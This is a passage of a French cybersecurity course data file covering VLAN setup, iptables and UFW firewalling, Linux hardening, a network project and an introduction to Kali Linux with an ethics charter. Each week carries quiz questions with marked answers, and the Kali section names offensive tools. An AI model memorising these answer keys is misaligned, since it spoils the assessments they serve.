  analogy: { title: "🏢 Les VLAN comme des étages cloisonnés d'un immeuble", text: "Dans un immeuble de bureaux, chaque étage peut être cloisonné : le service comptabilité ne partage pas le même espace que le service commercial, même si tous utilisent le même bâtiment et les mêmes ascenseurs. Les VLAN (IEEE 802.1Q) fonctionnent ainsi : un même switch physique héberge plusieurs réseaux logiques totalement isolés les uns des autres." },
  keyTerms: [
    { term: "VLAN", def: "Virtual LAN : réseau local virtuel qui segmente logiquement un réseau physique unique, normalisé par IEEE 802.1Q." },
    { term: "Trunk", def: "Lien réseau transportant le trafic de plusieurs VLAN simultanément entre deux équipements, grâce à l'étiquetage 802.1Q." },
    { term: "Table de routage", def: "Table utilisée par un routeur pour déterminer le chemin à emprunter vers un réseau de destination." },
    { term: "Packet Tracer", def: "Simulateur réseau développé par Cisco, utilisé pour s'entraîner à la configuration d'équipements sans matériel physique." },
    { term: "GNS3", def: "Simulateur réseau open source capable d'émuler des images réelles d'équipements (routeurs, pare-feux) pour des scénarios avancés." }
  ],
  lesson: [
    { heading: "Concevoir un plan d'adressage", html: "<p>Avant toute configuration, on documente un plan d'adressage : combien de segments, combien d'hôtes par segment, quelle plage IP pour chacun. Exemple pour un petit réseau d'entreprise :</p><pre><code>VLAN 10 (Direction)    : 192.168.10.0/24\nVLAN 20 (Comptabilité) : 192.168.20.0/24\nVLAN 30 (Invités)      : 192.168.30.0/24</code></pre><p>Cette étape évite les conflits d'adresses et facilite l'application de règles de pare-feu cohérentes par segment, comme étudié en semaine 11.</p>" },
    { heading: "Installer un simulateur réseau", html: "<p>Cisco Packet Tracer est gratuit via l'inscription à la Networking Academy et suffit pour la plupart des scénarios pédagogiques. GNS3, plus avancé, permet d'émuler des images système réelles et convient aux scénarios de niveau supérieur. Installez l'un des deux et vérifiez que l'interface graphique (glisser-déposer d'équipements) fonctionne correctement.</p>" },
    { heading: "Construire une topologie", html: "<p>Une topologie simple associe un routeur, deux switchs et plusieurs postes clients. Chaque équipement reçoit une adresse IP conforme au plan d'adressage préparé, et chaque câble doit relier le bon type d'interface (cuivre droit entre switch et PC, croisé entre switchs si nécessaire selon l'équipement).</p>" },
    { heading: "Configurer des VLAN (IEEE 802.1Q)", html: "<p>Sur un switch Cisco (réel ou simulé), la création de VLAN suit une syntaxe standard :</p><pre><code>Switch> enable\nSwitch# configure terminal\nSwitch(config)# vlan 10\nSwitch(config-vlan)# name Direction\nSwitch(config-vlan)# exit\nSwitch(config)# interface fastEthernet 0/1\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 10</code></pre><p>Pour transporter plusieurs VLAN sur un même lien entre deux switchs, on configure un <strong>trunk</strong> avec encapsulation 802.1Q :</p><pre><code>Switch(config)# interface fastEthernet 0/24\nSwitch(config-if)# switchport mode trunk\nSwitch(config-if)# switchport trunk encapsulation dot1q</code></pre>" },
    { heading: "Tester la connectivité", html: "<p>Une fois la topologie configurée, on valide la connectivité avec les commandes standards :</p><pre><code>ping 192.168.10.1\ntracert 192.168.20.1   (Windows)\ntraceroute 192.168.20.1 (Linux/Cisco)</code></pre><p>Deux hôtes du même VLAN doivent communiquer directement ; deux hôtes de VLAN différents ne doivent communiquer qu'en passant par un routeur configuré pour le routage inter-VLAN (router-on-a-stick ou routage niveau 3).</p>" }
  ],
  standards: ["IEEE 802.1Q — Virtual Bridged Local Area Networks (VLAN)", "IEEE 802.3 — Ethernet", "CompTIA Network+ — Domaine 2.0 : Network Implementation"],
  steps: [
    { text: "Concevoir un plan d'adressage IP pour plusieurs segments réseau.", color: "blue" },
    { text: "Installer et prendre en main Packet Tracer ou GNS3.", color: "orange" },
    { text: "Simuler une topologie réseau avec routeurs, switchs et postes clients.", color: "blue" },
    { text: "Configurer des VLAN et un lien trunk 802.1Q.", color: "orange" },
    { text: "Tester la connectivité intra-VLAN et inter-VLAN.", color: "blue" },
    { text: "Livrable : schéma du réseau simulé avec configuration documentée.", color: "red" }
  ],
  deliverable: "Un fichier de projet Packet Tracer (ou GNS3) fonctionnel comportant au moins 2 VLAN, un routeur assurant le routage inter-VLAN, et un schéma documenté du plan d'adressage utilisé.",
  tp: {
    title: "TP S10 — Simuler un petit réseau segmenté par VLAN",
    objectif: "Construire, configurer et tester un réseau simulé multi-VLAN reproduisant un scénario d'entreprise réaliste.",
    duree: "90–120 minutes",
    materiel: ["Cisco Packet Tracer ou GNS3 installé", "Un plan d'adressage préparé", "Documentation officielle Cisco IOS (commandes de base)"],
    consignes: [
      "Rédiger le plan d'adressage pour 2 VLAN (ex. VLAN 10 Direction et VLAN 20 Comptabilité) avec leurs plages IP respectives.",
      "Placer dans le simulateur un routeur, un switch et 4 postes clients (2 par VLAN).",
      "Créer les 2 VLAN sur le switch et assigner chaque port d'accès au VLAN correspondant.",
      "Configurer les sous-interfaces du routeur (ou routage niveau 3) pour permettre la communication inter-VLAN.",
      "Attribuer les adresses IP à chaque poste selon le plan d'adressage.",
      "Tester avec `ping` la connectivité entre deux postes du même VLAN, puis entre deux postes de VLAN différents.",
      "Documenter la topologie finale et les résultats des tests de connectivité dans un schéma annoté."
    ],
    livrable: "Fichier de simulation (.pkt ou .gns3) accompagné d'un schéma annoté du réseau et d'un tableau des résultats de tests de connectivité (ping réussi/échoué).",
    criteres: ["Les 2 VLAN sont créés et correctement assignés aux ports", "Le routage inter-VLAN fonctionne (ping réussi entre VLAN différents via le routeur)", "Le plan d'adressage est cohérent et documenté", "Les tests de connectivité sont tracés et expliqués"]
  },
  quiz: [
    { q: "Quelle norme IEEE définit l'étiquetage des VLAN ?", options: ["802.3", "802.11", "802.1Q", "802.1X"], correct: 2, explanation: "IEEE 802.1Q est la norme qui définit le marquage (tagging) des trames Ethernet pour transporter plusieurs VLAN sur un même lien." },
    { q: "Que permet un lien trunk entre deux switchs ?", options: ["Doubler la vitesse du câble", "Transporter le trafic de plusieurs VLAN sur un seul lien physique", "Chiffrer automatiquement le trafic", "Supprimer le besoin d'adressage IP"], correct: 1, explanation: "Un trunk 802.1Q permet de faire transiter le trafic de plusieurs VLAN sur une seule liaison physique entre deux équipements réseau." },
    { q: "Deux postes appartenant à deux VLAN différents peuvent-ils communiquer directement sans équipement de couche 3 ?", options: ["Oui, toujours", "Non, un routage inter-VLAN est nécessaire", "Oui, mais uniquement en Wi-Fi", "Cela dépend uniquement du câble utilisé"], correct: 1, explanation: "Les VLAN isolent le trafic au niveau logique ; un équipement de couche 3 (routeur ou switch niveau 3) est nécessaire pour router le trafic entre deux VLAN distincts." },
    { q: "Quelle commande Cisco IOS crée un VLAN numéro 10 ?", options: ["vlan create 10", "switchport vlan 10", "vlan 10", "interface vlan10"], correct: 2, explanation: "En mode configuration globale, la commande `vlan 10` crée le VLAN et bascule vers le sous-mode de configuration VLAN où l'on peut lui donner un nom." },
    { q: "Pourquoi établir un plan d'adressage avant de construire une topologie réseau ?", options: ["Ce n'est pas nécessaire avec un simulateur", "Pour éviter les conflits d'adresses et faciliter les règles de sécurité", "Pour accélérer le débit réseau", "Uniquement pour respecter une obligation légale"], correct: 1, explanation: "Un plan d'adressage documenté évite les conflits d'IP, structure la segmentation logique et facilite l'application cohérente de règles de pare-feu par segment." }
  ]
},
{
  id: "S11", week: 11, phase: 2,
  title: "Pare-feu et sécurité système",
  level: "intermediaire",
  duration: "Semaine 11 · ~7h",
  intro: "Un réseau bien conçu doit aussi être filtré et durci. Cette semaine aborde le pare-feu Linux iptables et son interface simplifiée UFW, puis élargit la perspective au durcissement système (hardening) et à la gestion des mises à jour — des compétences directement alignées sur les recommandations du NIST SP 800-41 pour les pare-feux.",
  objectives: [
    "Expliquer l'architecture d'iptables : tables, chaînes et règles.",
    "Configurer des règles de filtrage iptables adaptées à un scénario donné.",
    "Utiliser UFW comme interface simplifiée de gestion du pare-feu.",
    "Appliquer des mesures de durcissement (hardening) sur un système Linux.",
    "Mettre en place une politique de gestion des mises à jour de sécurité."
  ],
  definition: "Règles de filtrage iptables. Durcissement (hardening) d'un système Linux. Gestion des mises à jour de sécurité.",
  analogy: { title: "🚪 Le pare-feu comme un agent de sécurité à l'entrée", text: "Un agent de sécurité filtre qui entre et qui sort d'un bâtiment selon une liste de règles précises : badge valide, liste d'invités, horaires autorisés. iptables joue exactement ce rôle pour un système Linux, en filtrant chaque paquet réseau selon des règles définies dans des chaînes (INPUT, OUTPUT, FORWARD)." },
  keyTerms: [
    { term: "iptables", def: "Outil de pare-feu Linux permettant de définir des règles de filtrage de paquets organisées en tables et en chaînes." },
    { term: "Chaîne", def: "Ensemble ordonné de règles appliquées à un type de trafic précis : INPUT (entrant), OUTPUT (sortant), FORWARD (transitant)." },
    { term: "UFW", def: "Uncomplicated Firewall : surcouche simplifiée d'iptables, pensée pour une configuration rapide et lisible." },
    { term: "Durcissement (hardening)", def: "Ensemble de mesures visant à réduire la surface d'attaque d'un système : désactivation de services inutiles, restriction des accès, mise à jour régulière." },
    { term: "Moindre privilège", def: "Principe de sécurité selon lequel chaque compte ou service ne dispose que des droits strictement nécessaires à sa fonction." }
  ],
  lesson: [
    { heading: "Comprendre iptables : tables et chaînes", html: "<p>iptables organise le filtrage réseau Linux en <strong>tables</strong> (filter, nat, mangle...) elles-mêmes divisées en <strong>chaînes</strong> : <code>INPUT</code> pour le trafic entrant destiné à la machine, <code>OUTPUT</code> pour le trafic sortant, <code>FORWARD</code> pour le trafic transitant (routage). Chaque chaîne contient une liste ordonnée de règles évaluées séquentiellement jusqu'à la première correspondance.</p>" },
    { heading: "Écrire des règles iptables", html: "<p>Une politique de pare-feu robuste suit le principe du <em>deny by default</em> : tout est bloqué sauf ce qui est explicitement autorisé.</p><pre><code># Politique par défaut : tout bloquer\nsudo iptables -P INPUT DROP\nsudo iptables -P FORWARD DROP\n\n# Autoriser le trafic déjà établi\nsudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# Autoriser SSH (port 22) et HTTPS (port 443)\nsudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT\nsudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# Autoriser le loopback\nsudo iptables -A INPUT -i lo -j ACCEPT</code></pre><p>Ce jeu de règles, recommandé par le NIST SP 800-41, illustre une approche de filtrage restrictive typique d'un serveur exposé.</p>" },
    { heading: "Simplifier avec UFW", html: "<p>UFW (Uncomplicated Firewall) traduit ces principes en commandes plus lisibles, idéales pour un usage courant :</p><pre><code>sudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow 22/tcp\nsudo ufw allow 443/tcp\nsudo ufw enable\nsudo ufw status verbose</code></pre>" },
    { heading: "Durcir un système Linux", html: "<p>Le pare-feu n'est qu'une des couches de défense. Un durcissement complet inclut :</p><ul><li>Désactiver la connexion SSH en root (<code>PermitRootLogin no</code> dans <code>/etc/ssh/sshd_config</code>).</li><li>Supprimer ou désactiver les services et paquets inutilisés.</li><li>Appliquer le principe du moindre privilège sur les comptes utilisateurs (<code>sudo</code> ciblé plutôt que root permanent).</li><li>Mettre en place <code>fail2ban</code> pour bannir automatiquement les tentatives de connexion abusives.</li></ul>" },
    { heading: "Gérer les mises à jour de sécurité", html: "<p>La majorité des compromissions exploitent des vulnérabilités déjà corrigées par un correctif non appliqué. Une politique de mise à jour rigoureuse combine vérification régulière et application planifiée :</p><pre><code>sudo apt update && sudo apt upgrade -y\nsudo apt list --upgradable\n\n# Activer les mises à jour de sécurité automatiques (Debian/Ubuntu)\nsudo apt install unattended-upgrades\nsudo dpkg-reconfigure unattended-upgrades</code></pre>" }
  ],
  standards: ["NIST SP 800-41 Rev.1 — Guidelines on Firewalls and Firewall Policy", "CIS Benchmarks — Distribution Independent Linux", "CompTIA Security+ — Domaine 3.0 : Security Architecture"],
  steps: [
    { text: "Comprendre l'architecture d'iptables : tables et chaînes.", color: "blue" },
    { text: "Configurer des règles de filtrage restrictives (deny by default).", color: "orange" },
    { text: "Utiliser UFW comme interface simplifiée de pare-feu.", color: "blue" },
    { text: "Durcir un système Linux : SSH, comptes, services inutiles.", color: "orange" },
    { text: "Mettre en place une gestion planifiée des mises à jour de sécurité.", color: "blue" },
    { text: "Livrable : politique de pare-feu documentée et appliquée.", color: "red" }
  ],
  deliverable: "Une politique de pare-feu documentée (règles iptables ou UFW appliquées et testées sur une VM), accompagnée d'une checklist de durcissement Linux réalisée et d'une procédure de gestion des mises à jour.",
  tp: {
    title: "TP S11 — Configurer un pare-feu et durcir un système Linux",
    objectif: "Mettre en place une politique de filtrage restrictive et appliquer des mesures de durcissement concrètes sur une machine Linux.",
    duree: "90 minutes",
    materiel: ["Une VM Linux (Ubuntu/Debian recommandé)", "Accès sudo", "Client SSH pour tester la connectivité"],
    consignes: [
      "Sur la VM, définir une politique par défaut restrictive avec UFW (`deny incoming`, `allow outgoing`).",
      "Autoriser explicitement les ports strictement nécessaires (ex. 22/tcp pour SSH).",
      "Vérifier l'application des règles avec `sudo ufw status verbose` et tester une connexion SSH depuis une autre machine.",
      "Désactiver la connexion SSH root directe en modifiant `/etc/ssh/sshd_config` (`PermitRootLogin no`) et redémarrer le service SSH.",
      "Lister les services actifs (`systemctl list-units --type=service`) et désactiver au moins un service inutile.",
      "Mettre à jour le système (`apt update && apt upgrade`) et vérifier les mises à jour de sécurité disponibles.",
      "Rédiger un document de politique de pare-feu résumant les règles appliquées et leur justification."
    ],
    livrable: "Document de politique de pare-feu (règles UFW/iptables + justification) et checklist de durcissement complétée, avec captures d'écran des commandes exécutées.",
    criteres: ["La politique par défaut est restrictive (deny by default) et documentée", "Les règles autorisées sont justifiées par un besoin réel", "Au moins 2 mesures de durcissement (SSH, service désactivé, mises à jour) sont appliquées et vérifiées", "Le document est clair et réutilisable comme référence"]
  },
  quiz: [
    { q: "Quelle chaîne iptables filtre le trafic entrant destiné à la machine locale ?", options: ["OUTPUT", "FORWARD", "INPUT", "NAT"], correct: 2, explanation: "La chaîne INPUT s'applique au trafic entrant dont la destination finale est la machine elle-même, contrairement à FORWARD qui concerne le trafic routé à travers elle." },
    { q: "Que signifie le principe « deny by default » appliqué à un pare-feu ?", options: ["Bloquer uniquement les IP connues comme malveillantes", "Tout bloquer par défaut et n'autoriser explicitement que ce qui est nécessaire", "Autoriser tout le trafic sortant sans restriction", "Désactiver le pare-feu en dehors des heures de bureau"], correct: 1, explanation: "Le principe 'deny by default', recommandé par le NIST SP 800-41, consiste à bloquer tout le trafic par défaut et n'autoriser explicitement que les flux nécessaires, réduisant ainsi la surface d'attaque." },
    { q: "Quel outil constitue une surcouche simplifiée d'iptables sous Ubuntu/Debian ?", options: ["fail2ban", "UFW", "SELinux", "AppArmor"], correct: 1, explanation: "UFW (Uncomplicated Firewall) simplifie la syntaxe de configuration du pare-feu tout en s'appuyant sur iptables/nftables en arrière-plan." },
    { q: "Pourquoi désactiver la connexion SSH directe en tant que root est-il recommandé ?", options: ["Cela accélère la connexion SSH", "Cela applique le principe du moindre privilège et limite l'impact d'un compte compromis", "Ce n'est utile que pour les serveurs Windows", "Cela n'a aucun effet sur la sécurité"], correct: 1, explanation: "Interdire la connexion root directe force l'utilisation d'un compte nominal avec élévation de privilèges tracée, limitant l'impact d'une compromission et respectant le principe du moindre privilège." },
    { q: "Pourquoi la gestion régulière des mises à jour est-elle une mesure de sécurité critique ?", options: ["Elle améliore uniquement l'esthétique de l'interface", "La majorité des compromissions exploitent des vulnérabilités déjà corrigées par un correctif", "Elle remplace le besoin d'un pare-feu", "Elle n'est nécessaire qu'une fois par an"], correct: 1, explanation: "De nombreuses attaques exploitent des failles pour lesquelles un correctif existe déjà ; une politique de mise à jour régulière ferme ces fenêtres d'exposition avant qu'elles ne soient exploitées." }
  ]
},
{
  id: "S12", week: 12, phase: 2,
  title: "Projet de phase 2",
  level: "intermediaire",
  duration: "Semaine 12 · ~8h",
  intro: "Cette semaine clôture la Phase 2 par un projet intégrateur : concevoir, configurer, tester et documenter un mini réseau sécurisé qui mobilise l'ensemble des compétences acquises depuis la semaine 7 — adressage, protocoles, segmentation VLAN, scripting Python et filtrage pare-feu. C'est aussi un exercice de documentation technique, compétence attendue de tout professionnel de la cybersécurité.",
  objectives: [
    "Concevoir l'architecture complète d'un mini réseau sécurisé.",
    "Configurer les machines, VLAN et règles de pare-feu du réseau conçu.",
    "Tester la connectivité et vérifier l'efficacité du filtrage mis en place.",
    "Produire une documentation technique complète et professionnelle.",
    "Présenter et justifier les choix d'architecture retenus."
  ],
  definition: "Conception d'un mini réseau sécurisé. Tests de connectivité et de filtrage. Rédaction d'une documentation technique complète.",
  analogy: { title: "🏗️ Le projet comme la remise des clés d'un chantier", text: "Un architecte ne livre pas seulement un bâtiment : il livre aussi les plans, les certificats de conformité et le dossier technique. Ce projet de fin de phase reproduit cette exigence professionnelle : le réseau fonctionnel ne suffit pas, il doit être accompagné d'une documentation qui permettrait à un autre technicien de le comprendre et de le maintenir." },
  keyTerms: [
    { term: "Architecture réseau", def: "Organisation logique et physique des équipements, segments et flux d'un réseau." },
    { term: "Segmentation", def: "Division d'un réseau en zones isolées (VLAN, sous-réseaux) afin de limiter la propagation d'une compromission." },
    { term: "Politique de sécurité", def: "Ensemble documenté des règles régissant les accès, le filtrage et les usages autorisés sur un système ou un réseau." },
    { term: "Dossier technique", def: "Document consolidant schémas, configurations et résultats de tests, destiné à assurer la traçabilité et la maintenabilité d'un projet." }
  ],
  lesson: [
    { heading: "Méthodologie de conduite de projet réseau", html: "<p>Un projet réseau professionnel suit toujours la même trame : <strong>analyse du besoin</strong>, <strong>conception</strong> (schéma, plan d'adressage), <strong>implémentation</strong> (configuration), <strong>tests</strong> (validation fonctionnelle et sécuritaire), puis <strong>documentation</strong>. Sauter une étape — en particulier les tests ou la documentation — est la cause la plus fréquente d'incidents en production.</p>" },
    { heading: "Concevoir l'architecture du mini réseau", html: "<p>Le scénario du projet reprend les briques des semaines précédentes : au moins 2 VLAN (ex. Administration et Invités), un routeur assurant le routage inter-VLAN, et un pare-feu appliquant une politique restrictive par segment.</p><pre><code>VLAN 10 (Admin)   : 10.0.10.0/24 — accès complet\nVLAN 20 (Invités) : 10.0.20.0/24 — accès Internet uniquement, pas d'accès à VLAN 10</code></pre>" },
    { heading: "Configurer et sécuriser les machines", html: "<p>Chaque machine du réseau simulé doit recevoir son adressage IP conforme au plan, et les règles de pare-feu (iptables/UFW, semaine 11) doivent traduire la politique voulue : le VLAN Invités ne doit jamais pouvoir initier de connexion vers le VLAN Admin, alors que l'inverse peut être autorisé pour l'administration.</p><pre><code># Sur le routeur/pare-feu : bloquer Invités → Admin\nsudo iptables -A FORWARD -s 10.0.20.0/24 -d 10.0.10.0/24 -j DROP</code></pre>" },
    { heading: "Tester connectivité et filtrage", html: "<p>La validation doit couvrir deux angles : la connectivité attendue (ping entre hôtes autorisés, résolution DNS, accès Internet) et le filtrage attendu (tentative bloquée entre VLAN Invités et VLAN Admin, port fermé sur un scan Nmap ou avec le script Python de la semaine 9). Chaque test doit être tracé avec sa commande, son résultat attendu et son résultat obtenu.</p>" },
    { heading: "Rédiger la documentation technique", html: "<p>Un dossier technique complet comprend généralement : un schéma d'architecture, le plan d'adressage, la liste des règles de pare-feu avec justification, les résultats des tests de connectivité/filtrage, et une synthèse des choix de sécurité retenus. Cette structure s'inspire des bonnes pratiques de documentation de contrôles réseau recommandées par des référentiels comme l'ISO/IEC 27001 (Annexe A, contrôles réseau) et le NIST SP 800-41.</p>" }
  ],
  standards: ["NIST SP 800-41 Rev.1 — Guidelines on Firewalls and Firewall Policy", "ISO/IEC 27001:2022 — Annexe A, contrôles de sécurité réseau (A.8.20 à A.8.22)", "CompTIA Network+ / Security+ — Documentation et gestion de la configuration réseau"],
  steps: [
    { text: "Concevoir l'architecture d'un mini réseau sécurisé (schéma + plan d'adressage).", color: "blue" },
    { text: "Configurer les machines, VLAN et règles de pare-feu correspondantes.", color: "orange" },
    { text: "Tester la connectivité autorisée et vérifier l'efficacité du filtrage.", color: "blue" },
    { text: "Documenter intégralement l'architecture et les résultats de tests.", color: "orange" },
    { text: "Livrable : dossier technique complet du mini réseau sécurisé.", color: "red" }
  ],
  deliverable: "Un dossier technique complet regroupant le schéma d'architecture, le plan d'adressage, les règles de pare-feu justifiées, les résultats documentés des tests de connectivité et de filtrage, et une synthèse des choix de sécurité — ce dossier clôt la Phase 2 et sert de référence pour la Phase 3.",
  tp: {
    title: "TP S12 — Projet intégrateur : mini réseau sécurisé documenté",
    objectif: "Mobiliser l'ensemble des compétences de la Phase 2 (adressage, VLAN, pare-feu, tests, documentation) dans un projet unique et cohérent.",
    duree: "3–4 heures (réparties sur la semaine)",
    materiel: ["Packet Tracer/GNS3 ou VM Linux", "Outils du TP S9 (script Python) et S11 (iptables/UFW)", "Éditeur de documents pour le dossier technique"],
    consignes: [
      "Définir le scénario du mini réseau : au moins 2 segments (VLAN ou sous-réseaux) avec des niveaux de confiance différents.",
      "Produire le schéma d'architecture et le plan d'adressage détaillé des deux segments.",
      "Configurer les VLAN, le routage inter-VLAN et les règles de pare-feu appliquant la politique de sécurité voulue.",
      "Tester la connectivité autorisée (ping, accès Internet) et consigner les résultats.",
      "Tester le filtrage attendu (tentative de connexion bloquée entre segments, scan de ports) et consigner les résultats, en réutilisant si possible le script Python de la semaine 9.",
      "Rédiger le dossier technique complet : schéma, plan d'adressage, règles de pare-feu justifiées, résultats de tests, synthèse.",
      "Relire le dossier et vérifier qu'un tiers pourrait reproduire l'architecture à partir des seules informations fournies."
    ],
    livrable: "Dossier technique complet (schéma, plan d'adressage, configuration, résultats de tests, synthèse) accompagné du fichier de simulation ou des captures de configuration réelle.",
    criteres: ["L'architecture comporte au moins 2 segments isolés avec une politique de filtrage cohérente", "Les tests de connectivité et de filtrage sont documentés avec commande, résultat attendu et résultat obtenu", "Le dossier technique est complet, structuré et compréhensible par un tiers", "Les choix de sécurité sont justifiés et cohérents avec les standards vus en Phase 2 (NIST SP 800-41)"]
  },
  quiz: [
    { q: "Quelle est la première étape d'une méthodologie de projet réseau professionnelle ?", options: ["La configuration des équipements", "L'analyse du besoin et la conception", "La rédaction de la documentation", "Le test de connectivité"], correct: 1, explanation: "Une méthodologie rigoureuse commence toujours par l'analyse du besoin et la conception (schéma, plan d'adressage), avant toute implémentation technique." },
    { q: "Dans le scénario du projet, pourquoi le VLAN Invités ne doit-il pas pouvoir initier de connexion vers le VLAN Admin ?", options: ["Pour des raisons esthétiques uniquement", "Pour appliquer une politique de moindre privilège et limiter la surface d'attaque", "Parce que cela ralentit le réseau", "Ce n'est pas nécessaire si un antivirus est installé"], correct: 1, explanation: "Isoler les segments à faible confiance des segments sensibles applique le principe de moindre privilège et de segmentation, limitant la propagation d'une éventuelle compromission." },
    { q: "Que doit obligatoirement contenir un test documenté de connectivité ou de filtrage ?", options: ["Uniquement une capture d'écran", "La commande utilisée, le résultat attendu et le résultat obtenu", "Le nom de l'étudiant uniquement", "Une estimation du temps de réponse"], correct: 1, explanation: "Un test documenté professionnellement doit permettre la traçabilité : commande exécutée, résultat attendu, résultat réellement obtenu, pour être reproductible et vérifiable." },
    { q: "Quel référentiel est cité en semaine 12 pour la documentation des contrôles de sécurité réseau ?", options: ["ISO/IEC 27001 — Annexe A", "IEEE 802.11", "RFC 791", "PEP 8"], correct: 0, explanation: "L'ISO/IEC 27001:2022, dans son Annexe A, définit des contrôles de sécurité réseau qui inspirent la structure d'une documentation technique professionnelle." },
    { q: "Pourquoi la documentation technique est-elle considérée comme un livrable aussi important que la configuration elle-même ?", options: ["Parce que la loi l'exige systématiquement", "Parce qu'elle assure la traçabilité et permet à un tiers de maintenir le réseau", "Parce qu'elle remplace les tests de sécurité", "Parce qu'elle est plus rapide à produire que la configuration"], correct: 1, explanation: "Sans documentation, un réseau fonctionnel devient impossible à maintenir ou auditer par un tiers ; la documentation garantit la traçabilité et la continuité, exigence centrale des référentiels professionnels." }
  ]
}
];

const PHASE3 = [
  {
    id: "S13", week: 13, phase: 3,
    title: "Prise en main de Kali Linux",
    level: "avance",
    duration: "Semaine 13 · ~8h",
    intro: "La Phase 3 d'HACKINÉTIQUE ouvre la partie la plus offensive du programme : le test d'intrusion. Avant de scanner, d'exploiter ou de post-exploiter quoi que ce soit, chaque futur pentester doit installer son arsenal — Kali Linux — et, plus important encore, signer et intérioriser une charte éthique. Sans autorisation écrite, aucune technique enseignée ici ne doit jamais être exécutée en dehors d'un laboratoire.",
    objectives: [
      "Installer et configurer Kali Linux dans une machine virtuelle isolée.",
      "Identifier les grandes familles d'outils Kali (recon, exploitation, post-exploitation, forensics).",
      "Comprendre et signer la charte éthique du hacker professionnel.",
      "Situer le cadre légal du pentest (autorisation écrite, périmètre, non-divulgation).",
      "Configurer un réseau isolé (NAT/host-only) pour ses futurs laboratoires."
    ],
    definition: "Kali Linux est une distribution Linux basée sur Debian, maintenue par Offensive Security, préinstallée avec plus de 600 outils de test d'intrusion, d'audit de sécurité et de forensics. Cette semaine couvre son installation en VM, un panorama de ses outils principaux, et la charte éthique qui encadre légalement toute utilisation.",
    analogy: { title: "🧰 Kali Linux comme caisse à outils du serrurier agréé", text: "Un serrurier professionnel possède des outils capables d'ouvrir n'importe quelle porte. Ce qui le distingue d'un cambrioleur n'est pas l'outil, mais l'autorisation écrite du propriétaire avant d'intervenir. Kali Linux, c'est votre caisse à outils : sa légitimité dépend entièrement du mandat que vous avez pour l'utiliser." },
    keyTerms: [
      { term: "Pentest (test d'intrusion)", def: "Simulation autorisée d'une cyberattaque visant à identifier les vulnérabilités d'un système avant qu'un attaquant réel ne les exploite." },
      { term: "Périmètre (scope)", def: "Liste précise des systèmes, adresses IP ou applications qu'un pentester est autorisé à tester, définie contractuellement avant toute intervention." },
      { term: "Charte éthique (Rules of Engagement)", def: "Document signé encadrant un test d'intrusion : périmètre, dates, techniques autorisées, contacts d'urgence, clause de confidentialité." },
      { term: "Machine virtuelle isolée", def: "Environnement virtualisé (VirtualBox, VMware) dont le réseau est configuré en mode NAT ou host-only pour empêcher tout trafic vers l'extérieur du laboratoire." }
    ],
    lesson: [
      { heading: "Pourquoi Kali Linux et pas un autre OS ?", html: "<p>Kali Linux n'est pas « juste une distribution Linux » : c'est un environnement préconfiguré et maintenu spécifiquement pour l'audit de sécurité offensif. Il regroupe des outils de reconnaissance (Nmap, theHarvester), d'analyse web (Burp Suite, OWASP ZAP), d'exploitation (Metasploit, SQLmap) et de post-exploitation (Mimikatz, BloodHound), tous organisés par catégorie dans le menu <code>Applications</code>.</p><p>Utiliser Kali en entreprise ou en freelance de manière légitime suppose systématiquement un <strong>mandat écrit</strong> : contrat de prestation, ordre de mission signé, ou autorisation explicite du propriétaire du système testé.</p>" },
      { heading: "Installation en machine virtuelle", html: "<p>Nous installons Kali en VM (VirtualBox ou VMware) plutôt qu'en dual-boot, pour deux raisons : l'isolation du réseau hôte, et la possibilité de revenir à un instantané (<em>snapshot</em>) propre après chaque manipulation.</p><pre><code># Vérifier la virtualisation matérielle activée dans le BIOS (VT-x/AMD-V)\n# Télécharger l'image officielle depuis kali.org/get-kali\n# Créer la VM : 2 vCPU, 4 Go RAM minimum, 40 Go disque, réseau en mode NAT ou Host-Only\n# Après installation :\nsudo apt update && sudo apt full-upgrade -y\nsudo apt install -y kali-linux-headless</code></pre><p>Le mode réseau <strong>Host-Only</strong> ou un <strong>réseau interne</strong> (NAT Network) est fortement recommandé pour tous les TP de cette phase : il garantit que Kali ne peut jamais atteindre Internet ni le réseau domestique par erreur.</p>" },
      { heading: "Panorama des outils par catégorie", html: "<p>Le menu Kali organise les outils selon les phases classiques d'un test d'intrusion (proches des tactiques MITRE ATT&CK) :</p><ul><li><strong>Information Gathering</strong> : Nmap, theHarvester, Recon-ng (reconnaissance).</li><li><strong>Vulnerability Analysis</strong> : Nikto, OpenVAS.</li><li><strong>Web Application Analysis</strong> : Burp Suite, OWASP ZAP, SQLmap.</li><li><strong>Exploitation Tools</strong> : Metasploit Framework, searchsploit.</li><li><strong>Password Attacks</strong> : Hydra, John the Ripper, Hashcat.</li><li><strong>Post Exploitation</strong> : Mimikatz (via Windows), BloodHound, Empire.</li><li><strong>Forensics / Reporting</strong> : Autopsy, dc3dd, Faraday.</li></ul><p>Cette phase du programme suivra approximativement cet ordre : reconnaissance (S14), analyse web (S15), injections (S16), exploitation (S17), CTF final (S18).</p>" },
      { heading: "La charte éthique : le socle non négociable", html: "<p>Aucune commande enseignée dans cette phase ne doit être exécutée contre un système que vous ne possédez pas ou pour lequel vous n'avez pas reçu d'<strong>autorisation écrite explicite</strong>. C'est la règle d'or, sans exception :</p><ul><li>Vous ne testez que vos propres machines virtuelles, ou des plateformes légales conçues pour l'entraînement (TryHackMe, HackTheBox, OWASP Juice Shop, DVWA, Metasploitable).</li><li>Un accès non autorisé à un système informatique tiers constitue une infraction pénale dans la quasi-totalité des juridictions (en France : article 323-1 du Code pénal ; loi béninoise n°2017-20 sur le numérique réprime également les accès frauduleux).</li><li>Même « juste pour voir », un scan de port sur un système non autorisé peut être considéré comme une tentative d'intrusion.</li></ul><p>Cette charte sera signée cette semaine et devra être rappelée avant chaque TP pratique du programme.</p>" },
      { heading: "Le cadre légal du pentest professionnel", html: "<p>Un pentest professionnel encadré s'appuie toujours sur : un <strong>contrat</strong> précisant le périmètre exact (IP, domaines, dates), des <strong>Rules of Engagement</strong> (techniques autorisées ou interdites, fenêtres horaires), et une clause de <strong>non-divulgation</strong> (NDA) protégeant les données découvertes. La méthodologie PTES (Penetration Testing Execution Standard) formalise ces étapes : Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting.</p>" }
    ],
